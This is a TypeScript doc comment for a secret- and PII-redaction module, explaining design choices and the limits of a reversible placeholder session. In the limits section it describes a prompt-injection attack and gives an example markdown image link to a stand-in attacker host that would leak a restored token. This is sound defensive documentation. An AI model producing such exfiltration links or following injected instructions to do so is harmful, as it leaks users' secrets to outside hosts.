/** Redaction of secrets, in two entry points (plus a reversible session for text): over free
 *  text and over parsed JSON.
 *
 *  - `redactText` blanks keys, tokens, PEM blocks (and, as a separate opt-in rule, e-mail
 *    addresses) in a string and counts the places it replaced, so a preview can say "N places
 *    redacted". Origin: ghostline's `redact`.
 *  - `redactFields` walks a JSON value and replaces every value under a secret-looking NAME with
 *    {@link REDACTED}, reporting the dotted paths. Origin: settings-assistant's `redact`.
 *  - `createRedactionSession` is the reversible variant of `redactText`: numbered placeholders go
 *    out, the originals are put back into the model's answer (see {@link RedactionSession}).
 *
 *  **Redact first, then cut.** When a text is cut into a window before it is redacted, a block
 *  that crosses the window boundary is no longer a pair: ghostline cut the context first and a
 *  PEM key running over the window edge went to the model in clear text. The orphan rules below
 *  catch a lone BEGIN or END half as a second line, but the order is the real protection: run
 *  `redactText` over the whole text, then slice.
 *
 *  - `redactKeys` / `redactKeysInValue` blank a LIST OF KNOWN KEYS (the apiKeys of the configured
 *    endpoints) in text or in a whole value, and any `Bearer <token>` echo. Origin: vault-crews'
 *    `redactSecrets` / `redactRunState` and llm-lab's `redactSecrets` / `redactRecordSecrets`, one copy chain.
 *  - `createPiiRedactor` replaces e-mail addresses, IBANs, phone numbers and credentials in URLs by
 *    numbered placeholders that stay the same for the same value across calls (training data, traces).
 *    Origin: llm-lab's `createPiiRedactor`.
 *
 *  **Why the two key/PII functions are their own functions and not rule sets for `redactText` /
 *  `createRedactionSession`** (measured 2026-10-10, "adapt before building beside"): (1) `scan` always
 *  appends the orphan rules, so `redactText('note -----END PRIVATE KEY----- …', rules)` gives
 *  `[redacted-private-key] …` and everything before an END marker is lost — a key list is no PEM
 *  scanner; (2) rule replacements are inserted literally, but the original Bearer rule keeps the
 *  spelling and whitespace of the word (`bearer\t••••`) and a rule pair cannot do that; (3) the kit's
 *  `Bearer {16,}` rule has no `i` flag and misses `Bearer xyz789abcdef` (12 characters), which both
 *  sources pin in a test and which is llm-lab's ONLY redaction (it passes no key); (4) `redactText`
 *  returns `{ text, count }`, the sources return a string; (5) the session issues `[redacted-<kind>-<n>]`
 *  with one global counter, llm-lab's traces and datasets hold `[EMAIL_1]` with a counter per label —
 *  re-expressing it would change every placeholder already written. `createPiiRedactor` therefore takes a
 *  `format(label, n)` and keeps the old shape as its default.
 *
 *  Rule sets are exported separately so a consumer picks the set it applies:
 *  {@link SECRET_REDACT_RULES} (keys, tokens, Bearer, PEM) and {@link EMAIL_REDACT_RULE}.
 *  {@link DEFAULT_REDACT_RULES} is the secret set only. */

// ---- reversible redaction ---------------------------------------------------------------

/** One-way `redactText` is wrong where the model's answer is written back into a note: a fixed
 *  placeholder would silently replace the user's key or address there. A session redacts with
 *  NUMBERED placeholders (`[redacted-token-1]`) and puts the originals back into the answer.
 *
 *  Limits:
 *  - **Where the original lands is the model's choice.** `restore` replaces a placeholder wherever
 *    it stands. A prompt-injected model can write it into a link or image URL or an HTML
 *    attribute (`![x](https://evil.example/?d=[redacted-token-1])`), and the restored answer then
 *    carries the secret there; if the consumer renders it, an image loads without any click.
 *    Pass the answer through `neutralizeModelMarkdown` BEFORE `restore` (it removes images and
 *    HTML; a link still needs a click) and never let the restored text reach a renderer or
 *    a network call unreviewed.
 *  - A placeholder-shaped literal in the INPUT (for example a history that was redacted earlier)
 *    cannot be told from an issued one and is restored if the session knows it; the session never
 *    issues such a literal to a different value.
 *  - Custom rules must not match placeholders or each other's output: rules run in sequence over
 *    the previous result, and a rule such as `[A-Za-z0-9-]{20,}` would eat the inside of an
 *    inserted `[redacted-…]`. The default rules do not.
 *  - If the model rephrases a placeholder (`[redacted token 1]`, a translation), it stays
 *  as written. The original is not lost — the session still holds it — but the user sees the
 *  placeholder instead of the value. The format uses only lowercase letters, digits, `[`, `]`
 *  and `-`, so a model can return it verbatim.
